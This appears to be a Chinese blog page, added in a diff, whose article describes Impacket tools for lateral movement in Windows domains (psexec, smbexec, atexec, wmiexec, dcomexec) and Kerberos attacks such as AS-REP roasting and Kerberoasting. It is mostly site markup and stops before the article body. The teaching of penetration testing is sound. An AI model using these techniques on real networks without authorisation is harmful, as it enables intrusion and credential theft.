@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>impacket工具的使用 | Lark's Blog</title><meta name="keywords" content="渗透测试,网络安全,impacket"><meta name="author" content="Lark"><meta name="copyright" content="Lark"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="impacket工具的使用"><meta name="application-name" content="impacket工具的使用"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="impacket工具的使用"><meta property="og:url" content="https://orangey1.github.io/posts/79bde3c4.html"><meta property="og:site_name" content="Lark's Blog"><meta property="og:description" content="在渗透测试中，横向移动（Lateral Movement）是指攻击者在获得一个系统的控制权限后，通过网络进一步渗透到其他系统的过程。Impacket 是一款强大的渗透测试工具集，提供了多种实现横向渗透的脚本，常见的工具包括 psexec.py、smbexec.py、atexec.py、dcomexe"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://orangey1.github.io/img/avatar.jpg"><meta property="article:author" content="Lark"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://orangey1.github.io/img/avatar.jpg"><meta name="description" content="在渗透测试中，横向移动（Lateral Movement）是指攻击者在获得一个系统的控制权限后，通过网络进一步渗透到其他系统的过程。Impacket 是一款强大的渗透测试工具集，提供了多种实现横向渗透的脚本，常见的工具包括 psexec.py、smbexec.py、atexec.py、dcomexe"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://orangey1.github.io/posts/79bde3c4.html"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: {"enable":true,"title":"与数百名博主无限进步","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"(╥﹏╥)我会想你的","backTitle":"(≧∇≦)我就知道你会回来~"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://twikoo-vercel-sigma-ruddy.vercel.app/',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Lark","link":"链接: ","source":"来源: Lark's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Lark\'s Blog',
+  title: 'impacket工具的使用',
+  postAI: '',
+  pageFillDescription: '项目地址, psexec.py, 简介, 工作原理, 依赖服务, 端口需求, 优缺点, 命令示例, 常用选项, smbexec.py, 简介, 工作原理, 依赖服务, 端口需求, 优缺点, 命令示例, 常用选项, atexec.py, 简介, 工作原理, 依赖服务, 端口请求, 优缺点, 命令示例, 常用选项, wmiexec.py, 简介, 工作原理, 依赖服务, 端口需求, 优缺点, 命令示例, 常用选项, dcomexec.py, 简介, 工作原理, 依赖服务, 端口需求, 优缺点, 命令示例, 常用选项, GetNPUsers.py（AS-REP Roasting）, GetUserSPNs.py（Kerberoasting）, addcomputer.py（增加机器账号), getST.py(请求ST）, samrdump.py(枚举域内用户), ticketConverter.py(票据转换), 参考文章在渗透测试中横向移动是指攻击者在获得一个系统的控制权限后通过网络进一步渗透到其他系统的过程是一款强大的渗透测试工具集提供了多种实现横向渗透的脚本常见的工具包括和尽管这些工具都可以执行远程命令但它们在工作原理依赖的服务以及使用条件上有显著差异项目地址版本版本简介是中非常经典的工具仿照了的工具它通过协议和远程过程调用服务实现远程命令执行具体流程是在目标主机上通过上传一个可执行文件然后利用启动该文件作为服务从而执行命令工作原理连接首先尝试通过协议连接到目标主机文件上传连接成功之后就会将一个可执行文件上传到目标系统的的共享文件夹如服务启动之后会利用启动该服务从而在目标系统上执行远程命令依赖服务服务需要目标主机开放服务通常是服务依赖于远程过程调用来启动服务端口需求用于通信这是的核心端口在早期的版本中可能使用这个端口进行通信但现代使用优缺点优点操作简单且不依赖于目标主机上的额外服务只要和可用即可且以管理员权限登录后直接以权限执行命令缺点容易被防火墙和入侵检测系统检测到因为文件上传和服务启动的行为很容易暴露尤其是在目标环境中开启了端口的安全监控时攻击行为会被察觉命令示例的值冒号用来分隔和冒号前为空表示未提供明文密码指定编码方式为用于处理中文输出以免出现乱码常用选项指定目标的端口目标回显的编码可先执行拿到回显编码指定创建服务的名称默认随机指定上传文件的名称默认随机简介是中的另一个工具功能与相似但工作方式略有不同它同样依赖于协议来执行远程命令但与不同不需要上传可执行文件相反它利用共享资源如或直接在目标主机上执行命令这使得相比更加隐蔽工作原理连接通过协议连接到目标系统共享资源连接成功可用通过目标主机上的共享资源如或来执行命令远程命令执行命令通过共享直接在目标系统上执行而不需要上传任何可执行文件依赖服务服务完全依赖于服务来实现命令执行无服务依赖与服务不同不依赖于服务来启动进程或服务端口需求同样需要通过端口进行通信在某些情况下如果目标系统使用较旧的协议可能还会使用优缺点优点相比不需要上传文件减少了被检测到风险它利用现有的共享资源直接执行命令这使得攻击行为更加隐蔽缺点依赖目标系统的共享权限如果目标系统的共享权限配置严格可能无法成功执行命令此外某些安全工具可能会对共享资源的异常访问进行监控命令示例常用选项自定义回显的共享路径默认为设置回显或者回显回显需要设置返回的类型简介是另一个用于远程执行命令的工具但它与和的工作原理有所不同它通过的任务计划程序服务来执行命令将命令作为计划任务添加到目标机器中然后立即执行工作原理任务计划程序将命令注册为计划任务立即执行任务一旦添加到目标系统中会立即启动执行命令依赖服务服务需要通过协议与目标主机建立连接服务需要服务来与目标系统的任务计划服务进行交互端口请求和需要通过这些端口与目标主机的和服务进行通信优缺点优点任务计划程序是系统中常用的工具执行命令的过程相对隐蔽且不需要上传额外的文件缺点需要目标系统的任务调度服务可用而且某些目标系统可能会对计划任务进行严格的安全控制命令示例常用选项使用登录的运行无回显不会主动调用如不运行直接运行命令简介是通过管理工具来执行远程命令的工具是系统的强大管理工具允许管理员和攻击者远程管理系统利用来执行命令是一种极为隐蔽的渗透工具工作原理协议通过协议执行命令不需要上传可执行文件远程命令命令通过在目标主机上执行避免了传统的文件上传和服务创建依赖服务服务需要目标系统启用服务服务需要通过与目标系统进行通信端口需求和用于与和服务进行通信高端端口可能会使用动态分配的高端端口优缺点优点非常隐蔽不容易被防火墙或入侵检测系统检测到缺点需要目标系统启用服务并且某些配置可能限制远程命令执行命令示例常用选项设置连接的共享路径默认不获取输出没有连接不运行直接运行命令设置返回的类型设置版本简介是通过分布式组件对象模型协议进行远程命令执行的工具它使用已注册的应用程序如或来执行命令由于协议较少用于渗透测试它的攻击行为更难被发现工作原理协议通过协议与目标主机建立连接并利用已注册的应用程序执行命令依赖服务服务需要目标系统启用吗服务服务需要与目标系统进行通信端口需求和需要这两个端口来与目标主机的和服务进行通信高端端口可能会使用动态分配的高端端口进行通信优缺点优点协议较为隐蔽不容易被传统防火墙或入侵检测系统检测到缺点依赖于服务且目标系统可能会有防御措施命令示例常用选项设置连接的共享路径默认不获取输出没有连接设置利用的类型设置版本设置返回的类型不运行直接运行命令脚本可以在域外查询指定域的用户请求服务票据需要提供域账号和密码查询用户下的将用户下所有的的保存到可以用进行破解使用用户下将用户下所有的的保存到可以用进行破解脚本可以在域外查询指定域的需要提供域账号和密码查询用户下的将用户下所有的的保存到可以用进行破解使用用户下将用户下所有的的保存到可以用进行破解增加机器账号进行基于资源约束委派攻击的时候需要一个机器账号进行控制于是使用该脚本可以创建一个机器账号使用时需要一个有效的域用户支持两种方式创建一种是协议另一种是协议协议创建机器账号协议创建机器账号修改已经创建的机器账号密码添加参数请求导入票据访问该服务使用上一步使用生成的票据指定的导入票据生成新的票据导入票据访问指定服务枚举域内用户票据转换可以将和格式的票据进行相互转换参考文章的使用总结工具中的横向渗透利器及其使用场景对比详解脚本利用指南',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-24 13:16:04',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/imgloaded.css"><meta name="generator" content="Hexo 8.1.1"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://orangey1.github.io/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">Lark's Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=17842893138&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://i1.wp.com/img.119990.xyz/i/2024/10/27/158164.webp" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://i1.wp.com/img.119990.xyz/i/2024/10/27/158164.webp"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://i1.wp.com/img.119990.xyz/i/2024/10/27/837362.webp" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://i1.wp.com/img.119990.xyz/i/2024/10/27/837362.webp"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Airbind/" style="font-size: 1.05rem;">Airbind<sup>1</sup></a><a href="/tags/AkaRed/" style="font-size: 1.05rem;">AkaRed<sup>1</sup></a><a href="/tags/Artifical/" style="font-size: 1.05rem;">Artifical<sup>1</sup></a><a href="/tags/Atom/" style="font-size: 1.05rem;">Atom<sup>1</sup></a><a href="/tags/Buster/" style="font-size: 1.05rem;">Buster<sup>1</sup></a><a href="/tags/CCTV/" style="font-size: 1.05rem;">CCTV<sup>1</sup></a><a href="/tags/Chromee/" style="font-size: 1.05rem;">Chromee<sup>1</sup></a><a href="/tags/Easypwn/" style="font-size: 1.05rem;">Easypwn<sup>1</sup></a><a href="/tags/Family/" style="font-size: 1.05rem;">Family<sup>1</sup></a><a href="/tags/Friendly/" style="font-size: 1.05rem;">Friendly<sup>1</sup></a><a href="/tags/Friendly2/" style="font-size: 1.05rem;">Friendly2<sup>1</sup></a><a href="/tags/Friendly3/" style="font-size: 1.05rem;">Friendly3<sup>1</sup></a><a href="/tags/HMV/" style="font-size: 1.05rem;">HMV<sup>34</sup></a><a href="/tags/HTB/" style="font-size: 1.05rem;">HTB<sup>21</sup></a><a href="/tags/Hero/" style="font-size: 1.05rem;">Hero<sup>1</sup></a><a href="/tags/Icecream/" style="font-size: 1.05rem;">Icecream<sup>1</sup></a><a href="/tags/Krustykrab/" style="font-size: 1.05rem;">Krustykrab<sup>1</sup></a><a href="/tags/Liceo/" style="font-size: 1.05rem;">Liceo<sup>1</sup></a><a href="/tags/Mathdop/" style="font-size: 1.05rem;">Mathdop<sup>1</sup></a><a href="/tags/Matrioshka/" style="font-size: 1.05rem;">Matrioshka<sup>1</sup></a><a href="/tags/Newbee/" style="font-size: 1.05rem;">Newbee<sup>1</sup></a><a href="/tags/OMG/" style="font-size: 1.05rem;">OMG<sup>1</sup></a><a href="/tags/Quick/" style="font-size: 1.05rem;">Quick<sup>1</sup></a><a href="/tags/Reversteg/" style="font-size: 1.05rem;">Reversteg<sup>1</sup></a><a href="/tags/Simple/" style="font-size: 1.05rem;">Simple<sup>1</sup></a><a href="/tags/SingDanceRap/" style="font-size: 1.05rem;">SingDanceRap<sup>1</sup></a><a href="/tags/Survey/" style="font-size: 1.05rem;">Survey<sup>1</sup></a><a href="/tags/TheWall/" style="font-size: 1.05rem;">TheWall<sup>1</sup></a><a href="/tags/Tryharder/" style="font-size: 1.05rem;">Tryharder<sup>1</sup></a><a href="/tags/Zero/" style="font-size: 1.05rem;">Zero<sup>1</sup></a><a href="/tags/ezRe/" style="font-size: 1.05rem;">ezRe<sup>1</sup></a><a href="/tags/p4l4nc4/" style="font-size: 1.05rem;">p4l4nc4<sup>1</sup></a><a href="/tags/quoted/" style="font-size: 1.05rem;">quoted<sup>1</sup></a><a href="/tags/todd/" style="font-size: 1.05rem;">todd<sup>1</sup></a><a href="/tags/twisted/" style="font-size: 1.05rem;">twisted<sup>1</sup></a><a href="/tags/uo/" style="font-size: 1.05rem;">uo<sup>1</sup></a><a href="/tags/%E5%90%AF%E8%88%AA/" style="font-size: 1.05rem;">启航<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>59</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">网络安全<sup>62</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA%E5%85%A5%E9%97%A8/" style="font-size: 1.05rem;">靶场入门<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/03/"><span class="card-archive-list-date">三月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">35</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/02/"><span class="card-archive-list-date">二月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/12/"><span class="card-archive-list-date">十二月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/09/"><span class="card-archive-list-date">九月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">三月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a><a class="article-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>网络安全</span></a><a class="article-meta__tags" href="/tags/impacket/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>impacket</span></a></span></div></div><h1 class="post-title" itemprop="name headline">impacket工具的使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-09-01T04:00:00.000Z" title="发表于 2022-09-01 12:00:00">2022-09-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-03-24T05:16:04.800Z" title="更新于 2026-03-24 13:16:04">2026-03-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">2.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock 